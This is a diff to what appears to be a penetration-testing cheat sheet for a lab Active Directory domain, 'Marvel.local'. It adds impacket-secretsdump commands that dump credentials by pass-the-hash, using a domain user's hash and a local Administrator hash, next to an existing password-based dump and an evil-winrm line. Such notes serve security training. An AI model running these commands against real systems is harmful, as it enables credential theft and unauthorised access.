@@ -190,5 +190,11 @@ docker run --rm -ti --name evil-winrm  oscarakaelvis/evil-winrm -i 192.168.1.105
 
 #### Credentials Dumping :
 ```bash
-impacket-secretsdump Marvel.local/fcastle:"Password@123"@192.168.154.131  
+impacket-secretsdump Marvel.local/fcastle:"Password@123"@192.168.154.131
+
+#using hash of domain user
+impacket-secretsdump Marvel.local/fcastle:@192.168.154.131 -hashes aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b
+
+#using hash of local user
+impacket-secretsdump Administrator:@192.168.154.131 -hashes aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b 
 ```
